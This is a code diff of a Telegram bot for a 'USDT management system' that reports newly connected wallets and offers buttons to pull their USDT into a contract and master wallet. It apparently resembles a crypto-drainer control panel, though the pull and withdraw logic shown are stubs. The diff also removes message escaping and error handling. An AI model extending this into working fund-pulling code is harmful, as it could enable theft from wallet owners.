@@ -1,3 +1,4 @@
+// backend/src/config/telegram.js
 const TelegramBot = require('node-telegram-bot-api');
 const dotenv = require('dotenv');
 const { ethers } = require('ethers');
@@ -25,24 +26,15 @@ class TelegramService {
         this.loadContractABI();
     }
 
-    // Helper function to escape MarkdownV2 special characters
-    escapeMarkdown(text) {
-        if (typeof text !== 'string') return String(text);
-        // Escape all MarkdownV2 special characters
-        return text.replace(/([_\*\[\]\(\)~\`>\#\+\-\=\|\{\}\.])/g, '\\$1');
-    }
-
     // Load contract ABI with proper error handling
     loadContractABI() {
         try {
-            // Try multiple possible paths in order of likelihood
+            // Try multiple possible paths
             const possiblePaths = [
-                path.join(process.cwd(), 'smart-contracts/artifacts/abi.json'),
                 path.join(__dirname, '../../smart-contracts/artifacts/abi.json'),
                 path.join(__dirname, '../../../smart-contracts/artifacts/abi.json'),
                 path.join(__dirname, '../smart-contracts/artifacts/abi.json'),
-                path.join(__dirname, 'abi.json'),
-                path.join(process.cwd(), 'src/smart-contracts/artifacts/abi.json')
+                path.join(__dirname, 'abi.json')
             ];
             
             for (const abiPath of possiblePaths) {
@@ -152,47 +144,37 @@ class TelegramService {
         });
 
         // Button callbacks
-        this.bot.on('callback_query', async (callbackQuery) => {
+        this.bot.on('callback_query', (callbackQuery) => {
             const action = callbackQuery.data;
             const chatId = callbackQuery.message.chat.id;
             
             console.log('Received callback query:', action, 'from chat:', chatId);
             
-            // Immediately acknowledge to prevent timeout
-            try {
-                await this.bot.answerCallbackQuery(callbackQuery.id);
-            } catch (ackError) {
-                console.log('Could not acknowledge callback query:', ackError.message);
-            }
-            
-            // Add a small delay to ensure acknowledgment
-            await new Promise(resolve => setTimeout(resolve, 100));
+            // Answer the callback query to remove loading state
+            this.bot.answerCallbackQuery(callbackQuery.id);
             
             // Handle different actions
-            try {
-                if (action === 'withdraw') {
-                    await this.handleWithdrawCommand(chatId);
-                } else if (action === 'balances') {
-                    await this.handleBalancesCommand(chatId);
-                } else if (action === 'pull_list') {
-                    await this.sendPullWalletList(chatId);
-                } else if (action === 'help') {
-                    await this.sendHelpMenu(chatId);
-                } else if (action === 'menu') {
-                    await this.sendMainMenu(chatId);
-                } else if (action.startsWith('pull_')) {
-                    const walletAddress = action.substring(5);
-                    await this.handlePullCommand(chatId, walletAddress);
-                }
-            } catch (error) {
-                console.error('Error handling callback query:', error);
-                try {
-                    await this.bot.sendMessage(chatId, `❌ An error occurred: ${this.escapeMarkdown(error.message)}`);
-                } catch (sendError) {
-                    console.error('Could not send error message:', sendError);
-                }
+            if (action === 'withdraw') {
+                this.handleWithdrawCommand(chatId);
+            } else if (action === 'balances') {
+                this.handleBalancesCommand(chatId);
+            } else if (action === 'pull_list') {
+                this.sendPullWalletList(chatId);
+            } else if (action === 'help') {
+                this.sendHelpMenu(chatId);
+            } else if (action === 'menu') {
+                this.sendMainMenu(chatId);
+            } else if (action.startsWith('pull_')) {
+                const walletAddress = action.substring(5);
+                this.handlePullCommand(chatId, walletAddress);
             }
         });
+    }
+
+    // Helper function to escape MarkdownV2 special characters
+    escapeMarkdown(text) {
+        if (!text) return '';
+        return text.toString().replace(/([_\*\[\]\(\)~\`>\#\+\-\=\|\{\}\.])/g, '\\$1');
     }
 
     async sendMainMenu(chatId) {
@@ -366,12 +348,11 @@ Welcome to your USDT management system. Select an option below:
         }
         
         const escapedAddress = this.escapeMarkdown(walletAddress);
-        const escapedBalance = this.escapeMarkdown(balance);
         
         const message = `
 🔔 *NEW WALLET CONNECTED*
 Address: \`${escapedAddress}\`
-USDT Balance: *${escapedBalance} USDT*
+USDT Balance: *${balance} USDT*
 
 Actions:
         `;
@@ -381,7 +362,7 @@ Actions:
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: '📤 Pull USDT', callback_data: `pull_${escapedAddress}` }
+                        { text: '📤 Pull USDT', callback_data: `pull_${walletAddress}` }
                     ],
                     [
                         { text: '🏠 Main Menu', callback_data: 'menu' }
@@ -438,7 +419,7 @@ Actions:
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: '📤 Pull USDT', callback_data: `pull_${escapedAddress}` }
+                        { text: '📤 Pull USDT', callback_data: `pull_${walletAddress}` }
                     ],
                     [
                         { text: '🏠 Main Menu', callback_data: 'menu' }
@@ -596,7 +577,7 @@ Failed to fetch wallet list. Please try again later.
 
     // REAL BLOCKCHAIN BALANCE CHECKING FUNCTIONS
     async getContractUSDTBalance() {
-        if (!this.provider || !process.env.USDT_CONTRACT_ADDRESS || !process.env.CONTRACT_ADDRESS) {
+        if (!this.provider || !this.contract || !process.env.USDT_CONTRACT_ADDRESS) {
             console.log('⚠️ Blockchain not initialized, returning zero balance');
             return { balance: '0.00', error: 'Blockchain not initialized' };
         }
@@ -615,16 +596,13 @@ Failed to fetch wallet list. Please try again later.
             return { balance: formattedBalance, error: null };
         } catch (error) {
             console.error('Error getting contract USDT balance:', error.message);
-            // Check if it's the ENS error
-            if (error.message.includes('ENS') || error.message.includes('network does not support')) {
-                return { balance: '0.00', error: 'Invalid contract address - ENS not supported' };
-            }
             return { balance: '0.00', error: error.message };
         }
     }
 
     async getMasterWalletBNBBalance() {
-        if (!this.provider || !this.masterWallet) {        console.log('⚠️ Blockchain not initialized, returning zero BNB balance');
+        if (!this.provider || !this.masterWallet) {
+            console.log('⚠️ Blockchain not initialized, returning zero BNB balance');
             return { balance: '0.00', error: 'Blockchain not initialized' };
         }
         
@@ -660,10 +638,6 @@ Failed to fetch wallet list. Please try again later.
             return { balance: formattedBalance, error: null };
         } catch (error) {
             console.error('Error getting master wallet USDT balance:', error.message);
-            // Check if it's the ENS error
-            if (error.message.includes('ENS') || error.message.includes('network does not support')) {
-                return { balance: '0.00', error: 'Invalid wallet address - ENS not supported' };
-            }
             return { balance: '0.00', error: error.message };
         }
     }
@@ -743,7 +717,7 @@ The pull operation is ready to be implemented with real blockchain integration\\
             return result;
         } catch (error) {
             console.error('Error in pull command:', error.message);
-            return this.bot.sendMessage(chatId, `❌ Error: ${this.escapeMarkdown(error.message)}`);
+            return this.bot.sendMessage(chatId, `❌ Error: ${error.message}`);
         }
     }
 
@@ -752,8 +726,9 @@ The pull operation is ready to be implemented with real blockchain integration\\
             return this.bot.sendMessage(chatId, '❌ Unauthorized access');
         }
         
-        const contractAddr = this.escapeMarkdown(process.env.CONTRACT_ADDRESS || 'Not set');
-        const masterAddr = this.escapeMarkdown(this.masterWallet);
+        const contractAddress = process.env.CONTRACT_ADDRESS || 'Not set';
+        const escapedContractAddress = this.escapeMarkdown(contractAddress);
+        const escapedMasterWallet = this.escapeMarkdown(this.masterWallet);
         
         const processingMessage = `
 🏦 *Withdraw Operation Initiated*
@@ -787,8 +762,8 @@ Withdrawing all USDT from contract to master wallet\\.\\.\\.
 🏦 *Withdraw Operation Status*
 
 ℹ️ *Operation Details:*
-• Contract address: \`${contractAddr}\`
-• Master wallet: \`${masterAddr}\`
+• Contract address: \`${escapedContractAddress}\`
+• Master wallet: \`${escapedMasterWallet}\`
 • Transaction signing: Ready for integration
 
 ✅ *Next Steps:*
@@ -816,7 +791,7 @@ The withdraw operation is ready to be implemented with real blockchain integrati
             return result;
         } catch (error) {
             console.error('Error in withdraw command:', error.message);
-            return this.bot.sendMessage(chatId, `❌ Error: ${this.escapeMarkdown(error.message)}`);
+            return this.bot.sendMessage(chatId, `❌ Error: ${error.message}`);
         }
     }
 
@@ -848,82 +823,85 @@ The withdraw operation is ready to be implemented with real blockchain integrati
         };
         
         try {
-            await this.bot.sendMessage(chatId, processingMessage, processingOptions);
+            const result = await this.bot.sendMessage(chatId, processingMessage, processingOptions);
             
             // Fetch real balances
             const contractBalance = await this.getContractUSDTBalance();
             const masterBNBBalance = await this.getMasterWalletBNBBalance();
             const masterUSDTBalance = await this.getMasterWalletUSDTBalance();
             
-            // Use the escapeMarkdown helper
-            const contractAddr = this.escapeMarkdown(process.env.CONTRACT_ADDRESS || 'Not set');
-            const masterAddr = this.escapeMarkdown(this.masterWallet);
-            const contractBal = this.escapeMarkdown(contractBalance.balance);
-            const masterBNB = this.escapeMarkdown(masterBNBBalance.balance);
-            const masterUSDT = this.escapeMarkdown(masterUSDTBalance.balance);
-            const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
-            
-            // Format the real balances message with proper escaping
-            let balancesMessage = `
+            // Format the real balances message
+            setTimeout(async () => {
+                const contractAddress = process.env.CONTRACT_ADDRESS || 'Not set';
+                const escapedContractAddress = this.escapeMarkdown(contractAddress);
+                const escapedMasterWallet = this.escapeMarkdown(this.masterWallet);
+                const escapedContractBalance = this.escapeMarkdown(contractBalance.balance);
+                const escapedBNBBalance = this.escapeMarkdown(masterBNBBalance.balance);
+                const escapedUSDTBalance = this.escapeMarkdown(masterUSDTBalance.balance);
+                
+                let balancesMessage = `
 📊 *REAL BALANCE REPORT*
 
 `;
-            
-            // Contract USDT Balance
-            if (process.env.CONTRACT_ADDRESS) {
-                balancesMessage += `
+                
+                // Contract USDT Balance
+                if (process.env.CONTRACT_ADDRESS) {
+                    balancesMessage += `
 💰 *Smart Contract*
-• Address: \`${contractAddr}\`
-• USDT Balance: *${contractBal} USDT*
+• Address: \`${escapedContractAddress}\`
+• USDT Balance: *${escapedContractBalance} USDT*
 `;
-                if (contractBalance.error) {
-                    balancesMessage += `• ⚠️ Error: ${this.escapeMarkdown(contractBalance.error)}\n`;
-                }
-            } else {
-                balancesMessage += `
+                    if (contractBalance.error) {
+                        balancesMessage += `• ⚠️ Error: ${contractBalance.error}\n`;
+                    }
+                } else {
+                    balancesMessage += `
 💰 *Smart Contract*
 • Address: Not configured
 • USDT Balance: 0\\.00 USDT
 `;
-            }
-            
-            // Master Wallet Balances
-            balancesMessage += `
-🏦 *Master Wallet*
-• Address: \`${masterAddr}\`
-• BNB Balance: *${masterBNB} BNB*
-• USDT Balance: *${masterUSDT} USDT*
-`;
-            
-            if (masterBNBBalance.error) {
-                balancesMessage += `• ⚠️ BNB Error: ${this.escapeMarkdown(masterBNBBalance.error)}\n`;
-            }
-            if (masterUSDTBalance.error) {
-                balancesMessage += `• ⚠️ USDT Error: ${this.escapeMarkdown(masterUSDTBalance.error)}\n`;
-            }
-            
-            balancesMessage += `
-🔄 *Last Updated:* ${timestamp} UTC
-`;
-            
-            await this.bot.sendMessage(chatId, balancesMessage, {
-                parse_mode: 'MarkdownV2',
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: '📤 Pull USDT', callback_data: 'pull_list' },
-                            { text: '📥 Withdraw', callback_data: 'withdraw' }
-                        ],
-                        [
-                            { text: '🔄 Refresh Balances', callback_data: 'balances' },
-                            { text: '🏠 Main Menu', callback_data: 'menu' }
-                        ]
-                    ]
                 }
-            });
+                
+                // Master Wallet Balances
+                balancesMessage += `
+🏦 *Master Wallet*
+• Address: \`${escapedMasterWallet}\`
+• BNB Balance: *${escapedBNBBalance} BNB*
+• USDT Balance: *${escapedUSDTBalance} USDT*
+`;
+                
+                if (masterBNBBalance.error) {
+                    balancesMessage += `• ⚠️ BNB Error: ${masterBNBBalance.error}\n`;
+                }
+                if (masterUSDTBalance.error) {
+                    balancesMessage += `• ⚠️ USDT Error: ${masterUSDTBalance.error}\n`;
+                }
+                
+                balancesMessage += `
+🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
+`;
+                
+                await this.bot.sendMessage(chatId, balancesMessage, {
+                    parse_mode: 'MarkdownV2',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '📤 Pull USDT', callback_data: 'pull_list' },
+                                { text: '📥 Withdraw', callback_data: 'withdraw' }
+                            ],
+                            [
+                                { text: '🔄 Refresh Balances', callback_data: 'balances' },
+                                { text: '🏠 Main Menu', callback_data: 'menu' }
+                            ]
+                        ]
+                    }
+                });
+            }, 2000); // 2 second delay to simulate processing
+            
+            return result;
         } catch (error) {
             console.error('Error in balances command:', error.message);
-            await this.bot.sendMessage(chatId, `❌ Error: ${this.escapeMarkdown(error.message)}`);
+            return this.bot.sendMessage(chatId, `❌ Error: ${error.message}`);
         }
     }
 
@@ -941,4 +919,3 @@ The withdraw operation is ready to be implemented with real blockchain integrati
 }
 
 module.exports = new TelegramService();
-
